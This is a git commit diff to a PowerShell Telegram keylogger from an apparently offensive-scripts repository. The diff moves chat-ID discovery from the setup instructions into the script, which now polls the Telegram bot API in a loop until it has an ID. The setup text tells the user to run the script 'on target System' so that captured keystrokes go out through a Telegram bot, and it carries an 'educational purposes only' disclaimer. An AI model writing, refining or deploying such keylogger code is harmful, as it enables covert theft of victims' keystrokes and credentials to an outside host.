906407c1c6643fb2ac3496dc5cd20403ee8edd97
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-09-17 09:57:59 +0100

    Update Telegram Keylogger.ps1

--- Telegram and Dropbox Scripts/Telegram Keylogger.ps1
+++ Telegram and Dropbox Scripts/Telegram Keylogger.ps1
@@ -8,26 +8,20 @@ SETUP INSTRUCTIONS
 1. visit https://t.me/botfather and make a bot.
 2. add bot api to script.
 3. search for bot in top left box in telegram and start a chat then type /start.
-4. add chat ID for the chat bot (use this below to find the chat id) 
-
----------------------------------------------------
-$Token = "Token_Here" # Your Telegram Bot Token 
-$url = 'https://api.telegram.org/bot{0}' -f $Token
-$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
-if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
-if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
------------------------------------------------------
-
 5. Run Script on target System
 
 THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
 #>
 #------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
 $Token = "TOKEN_HERE"  # Your Telegram Token
-$ChatID = "CHAT_ID_HERE"   # Your Chat ID (see above for setup)
 $PassPhrase = "$env:COMPUTERNAME"
 $URL='https://api.telegram.org/bot{0}' -f $Token 
-
+while($chatID.length -eq 0){
+$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
+if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
+if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
+Sleep 10
+}
 
 Function KeyCapture {
 $MessageToSend = New-Object psobject 
